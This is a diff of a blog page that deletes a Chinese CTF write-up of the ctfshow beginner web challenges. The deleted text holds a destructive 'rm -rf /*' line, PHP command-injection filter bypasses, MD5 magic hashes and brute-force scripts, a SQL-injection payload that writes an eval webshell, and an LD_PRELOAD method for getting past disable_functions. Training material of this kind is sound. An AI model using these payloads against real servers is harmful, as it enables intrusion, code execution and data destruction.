@@ -266,7 +266,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:50:31 / Modified: 10:50:52" itemprop="dateCreated datePublished" datetime="2020-08-28T10:50:31+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:50:31 / Modified: 13:45:21" itemprop="dateCreated datePublished" datetime="2020-08-28T10:50:31+08:00">2020-08-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -293,110 +293,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="ctfshow萌新计划刷题记录"><a href="#ctfshow萌新计划刷题记录" class="headerlink" title="ctfshow萌新计划刷题记录"></a>ctfshow萌新计划刷题记录</h2><p>萌新计划emmm….感觉前面算萌新后面就不萌了呢。</p>
-<h4 id="web1-7"><a href="#web1-7" class="headerlink" title="web1-7"></a>web1-7</h4><p>这几个题全部都是要想办法构造id=1000出来。乍一看以为考察sql注入，实则是考察mysql中的一些运算符的使用。0b1111101000这个payload可以全部绕过。</p>
-<blockquote>
-<p>总结一下这些题的姿势。构造数字1000(或者说是构造某个数字)可以使用的方法：</p>
-<p>0.直接使用这个数字</p>
-<p>1.进制转换：例如二进制0b1111101000 十六进制 0x38e</p>
-<p>2.字节操作：两次取反~~1000，异或200^800，按位与 992|8</p>
-<p>3.运算符，即加减乘除构造1000</p>
-</blockquote>
-<h4 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h4><p>这个题有点迷醉，，不知道为啥是传rm -rf /*，(好像是一个梗…？)</p>
-<h4 id="web9-15"><a href="#web9-15" class="headerlink" title="web9-15"></a>web9-15</h4><p>这些题的考察点是命令执行。不过由于是一个模子里出来的题..钻了个非预期的空子，因为知道包含了config.php，而且flag就在里面，那就直接echo $flag;就直接出答案了…如果出现了过滤分号的情况就直接?&gt;闭合语句，粗暴出答案。</p>
-<p>总结一下命令注入的点：</p>
-<h5 id="eval-cmd-的形式"><a href="#eval-cmd-的形式" class="headerlink" title="eval($cmd)的形式"></a>eval($cmd)的形式</h5><p>1.无过滤：直接任意执行系统命令即可。</p>
-<p>2.过滤了系统命令执行函数：php有很多能执行系统命令的函数，常用的有：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec,system,shell_exec,passthru,popen,proc_open,pcntl_exec,proc_open,反撇号</span><br></pre></td></tr></table></figure>
-
-<p>其中，system,passthru这两个函数将结果直接返回浏览器，无需echo或return，exec,shell_exec,反撇号这种形式都需要将结果存入一个数组或单独输出(直接输出只输出结果的最后一行)，否则不会显示。</p>
-<p>具体例子(常用的)：</p>
-<blockquote>
-<p>echo exec(“ls”); // index.php</p>
-<p>passthru(“ls”); // test.php config.php index.php</p>
-<p>system(“ls /“); // 显示根目录下所有文件</p>
-<p>echo `ls`; // test.php config.php index.php</p>
-</blockquote>
-<p>3.过滤了分号，这时候就只能执行一句代码而且必须用?&gt;来闭合。同样考虑上面的这些函数。</p>
-<p>4.注意灵活运用linux中显示文件信息的函数，例如cat被过滤了考虑tac，某个文件名被过滤了考虑使用*来显示所有的。</p>
-<p>5.可以尝试通过$_GET或$_POST来绕过对某个参数的过滤，例如c=echo `$_GET[1]`;&amp;1=tac flag.php。</p>
-<p>6.借助php可以动态执行命令的特性，通过两个变量构造出欲执行的函数名称和参数，例如<code>$a = base64_decode(&#39;c3lzdGVt&#39;);$b=base64_decode(&#39;Y2F0IGNvbmZpZy5waHA=&#39;);$a($b);</code></p>
-<p>7.借助assert函数，<code>assert(assertion)</code>:assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。且assert中的字符串可以没有分号。</p>
-<h4 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h4><p>这波反向跑路又秀到我了…答案是传入36d，爆破或者知道梗的就可以做出来emmm</p>
-<p>这里简单总结一下md5相关的绕过：</p>
-<h5 id="1-md5弱相等-if-md5-a-md5-b-amp-amp-a-b"><a href="#1-md5弱相等-if-md5-a-md5-b-amp-amp-a-b" class="headerlink" title="1.md5弱相等:if(md5($a)==md5(b) &amp;&amp; $a!==$b)"></a>1.md5弱相等:if(md5($a)==md5(b) &amp;&amp; $a!==$b)</h5><p>通过寻找0e开头的md5绕过，0e开头的会被识别做科学计数法，结果都是0.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>
-
-<h5 id="2-md5强相等if-a-b-amp-amp-md5-a-nd5-b"><a href="#2-md5强相等if-a-b-amp-amp-md5-a-nd5-b" class="headerlink" title="2.md5强相等if($a!==$b &amp;&amp; md5($a)===nd5($b))"></a>2.md5强相等if($a!==$b &amp;&amp; md5($a)===nd5($b))</h5><p>1)数组绕过：md5()和sha1()函数的共同特点是他们不能处理数组，他们处理数组全部返回null</p>
-<p>2)md5碰撞：这里给出一组值不相等但md5后完全相同的一组数据：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br><span class="line">$b=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// res: 008ee33a9d58b51cfeb425b0959121c9</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>ps1.附上md5爆破脚本：</p>
-<p>(1)数字型</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用实例：python md5crack_number.py &quot;abc&quot; 5 代表爆破开头为&quot;abc&quot;的MD5，数字型，爆破5个，若不指定第二个参数，则默认为1个</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	knownMd5 = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Wrong command line parameter&quot;</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findCode</span>(<span class="params">code</span>):</span></span><br><span class="line">    key = code.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])</span><br><span class="line">    end = int(key[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:len(knownMd5)] == knownMd5:</span><br><span class="line">            <span class="keyword">print</span> code</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">list=[]</span><br><span class="line">num=<span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	num = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;keep num=1 as default&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(num)):</span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()</span><br><span class="line">pool.map(findCode, list)</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
-
-<p>(2)字符型</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用实例：python md5crack_string.py &quot;abc&quot; 5 代表爆破开头为&quot;abc&quot;的MD5,字符型，长度默认为4(改进脚本可以指定爆破结果长度)，数量为5个，若不指定第二个参数，则默认为1个</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">addStr = <span class="string">&#x27;as&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    knownMd5 = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Wrong command line parameter&quot;</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">dict = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">num=<span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	num=int(sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"> 	<span class="keyword">print</span> <span class="string">&quot;keep num=1 as default&quot;</span></span><br><span class="line"></span><br><span class="line">res=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dict:</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">      <span class="keyword">for</span> k <span class="keyword">in</span> dict:</span><br><span class="line">          <span class="keyword">for</span> l <span class="keyword">in</span> dict:</span><br><span class="line">              <span class="keyword">if</span> res &lt; num:</span><br><span class="line">                  x = i + k + j + l</span><br><span class="line">                  b = x + addStr</span><br><span class="line">                  codeMd5 = md5(b)</span><br><span class="line">                  <span class="keyword">if</span> codeMd5[:len(knownMd5)] == knownMd5:</span><br><span class="line">                      print(x)</span><br><span class="line">                      res = res + <span class="number">1</span></span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                  sys.exit()</span><br></pre></td></tr></table></figure>
-
-<p>(3) 多重MD5截断</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用方法：python md5Crack.py &quot;你要碰撞的字符串&quot; 字符串的起始位置</span></span><br><span class="line"><span class="string">使用实例：python md5Crack.py &quot;0e&quot; 0 将产生MD5值为0e开头[即第0个字符开始数两位为0e]的字符串</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.letters + string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_md5</span>(<span class="params">substr, stop_event, str_len,start=<span class="number">0</span>, size=<span class="number">4</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> range(size))</span><br><span class="line">        md51 = hashlib.md5(rnds)</span><br><span class="line">        value1 = md51.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line">            <span class="comment">#碰撞双md5</span></span><br><span class="line">            md52 = hashlib.md5(value1)</span><br><span class="line">            <span class="keyword">if</span> md52.hexdigest()[start: start+str_len] == substr:</span><br><span class="line">                <span class="keyword">print</span> rnds+ <span class="string">&quot;=&gt;&quot;</span> + value1+<span class="string">&quot;=&gt;&quot;</span>+ md52.hexdigest()  + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                                <span class="comment">#stop_event.set()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    	substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    	<span class="keyword">print</span> <span class="string">&quot;Wrong command line parameter&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    start_pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start_pos = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;keep start_pos=0 as default&quot;</span></span><br><span class="line">    str_len = len(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> range(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>
-
-
-</blockquote>
-<h4 id="web17-22"><a href="#web17-22" class="headerlink" title="web17-22"></a>web17-22</h4><p>向nginx访问日志中注入php代码，蚁剑连接webshell</p>
-<h4 id="web23-24"><a href="#web23-24" class="headerlink" title="web23-24"></a>web23-24</h4><p>条件竞争访问上传的php。</p>
-<h4 id="获得百分之百的快乐"><a href="#获得百分之百的快乐" class="headerlink" title="获得百分之百的快乐"></a>获得百分之百的快乐</h4><p>登录处sql注入，向目录中写入webshell进行连接。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union <span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[1]) ?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>连接后发现flag.php提示flag在环境变量里，这里有两种方式输出结果。</p>
-<p>第一种相对简单，直接新建一个php文件，内容：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	print_r($_SERVER);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>随后浏览器访问即可获得flag。</p>
-<p>第二种比较复杂，借助LD_PRELOAD环境变量劫持突破disable_functions。</p>
-<p>简单说一下原理，<code>LD_PRELOAD</code>是linux中的一个环境变量，如果使用<code>LD_PRELOAD</code>环境变量指定了一个共享库或共享对象，那么这个共享对象会在其他对象加载前被加载。例如<code>LD_PRELOAD=/tmp/a.so /bin/ls</code>,即在执行<code>ls</code>命令前，会先加载指定路径的a.so文件，如果这是一个恶意共享对象，那么可以执行任意操作。</p>
-<p>我们可以通过LD_PRELOAD突破disable_functions，流程如下：</p>
-<p>1.编写恶意 C 函数，并编译成共享对象；</p>
-<p>2.在<code>php</code>执行过程中找到一个函数，这个函数能够产生一个新的进程；</p>
-<p>3.通过<code>putenv</code>设置<code>LD_PRELOAD</code>环境变量，使得新产生的进程优先加载恶意共享对象。</p>
-<p>首先由于被劫持的系统函数得由我们重新实现一次，函数原型必须一致，为减少复杂性，我们需要找到一个无参数且常用的系统函数，方便我们进行劫持操作。经过对几个常用命令的寻找<code> readelf -Ws /usr/bin/id</code>，我们发现了getuid()函数符合要求。<code>man getuid</code>查看一下函数定义，随后重写该函数。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getuid_evil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;echo &#x27;pwn it!&#x27;&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>随后编译成共享对象,<code>gcc -shared -fPIC getuid_evil.c -o getuid_evil.so</code>。</p>
-<p>最后，借助环境变量 LD_PRELOAD 劫持系统函数 getuid()，获取控制权。执行 LD_PRELOAD=/home/getuid_evil.so /usr/bin/id，注入代码成功执行。</p>
-<p>下面我们需要找寻内部启动新进程的 PHP 函数。虽然 LD_PRELOAD 提供了劫持系统函数的能力，但前提是得控制 php 启动外部程序才行。常见的 system() 启动程序方式显然不行，否则就不存在突破 disable_functions 一事了。PHP 脚本中除了调用 system()、exec()、shell_exec() 等等一堆 php 函数外，还有可能是php本身函数存在启动新进程。比如，php 函数 a() 实现“前进”的功能，php 函数 a() 又由组成 php 解释器的 C 语言模块之一的 b.c 实现，C 模块 b.c 内部又通过调用外部程序 c.bin 实现，那么，我的 php 脚本中调用了函数 a()，势必启动外部程序 c.bin。现在，我需要找到类似 a() 的真实存在的 PHP 函数。</p>
-<p>考虑哪样的函数可能会产生新进程。我们知道，进程不能直接调用硬件资源，比如读取磁盘文件、接收网络数据等，但可以将用户态模式（目态）切换到内核模式（管态），通过系统调用来访问硬件设备。这时通过strace命令就可以跟踪到一个进程产生的系统调用，包括参数，返回值，执行消耗的时间、调用次数，成功和失败的次数。这样我们可以做出一个初步判断，处理图片、请求网页、发送邮件等等场景中存在着我们需要的函数。分别尝试curl_init(),Imagick::newImage(),mail()这些函数，最终发现mail()函数存在启动新进程的情况。</p>
-<blockquote>
-<p>有一篇文章专门讲解了如何寻找满足产生新进程的函数。<a target="_blank" rel="noopener" href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/">在这里</a></p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mail.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	mail(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>随后执行命令<code>strace -f php mail.php 2&gt;&amp;1 | grep -E &quot;execve|fork|vfork&quot;</code>,查看<code>php mail.php</code>的程序执行过程中产生的所有系统调用。</p>
-<blockquote>
-<p>execve的主要作用为：<br>1.分配进程新的地址空间，将环境变量、main参数等拷贝到新地址空间的推栈中；<br>2.解析可执行文件，将代码、数据装入/映射到内存<br>3.进程新环境的设置，如关闭设置FD_CLOEXEC的文件等<br>4.设置execve函数返回到用户态时的执行地址；解析器入口地址或程序的入口地址</p>
-</blockquote>
-<p>通过输出结果我们发现mail函数的确启动了新进程。调用了/usr/sbin/sendmail。<code>readelf -Ws /usr/sbin/sendmail </code>查看发现sendmail也确实调用了getuid函数。故执行mail函数可以成功执行我们的恶意代码。</p>
-<p>但其实这个方法是将条件变得严苛了，我们干的事情局限于找到一个函数，然后对其进行注入。且真实情况下，某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail(比如我本地测试的时候才发现其实自己的wsl2中就没有安装sendmail，专门装了一下才进行操作的)，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1   lamp、lamp.、lamp.com）。基于这两个原因，我不得不放弃劫持函数 getuid()，必须找个更普适的方法。</p>
-<p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了。</p>
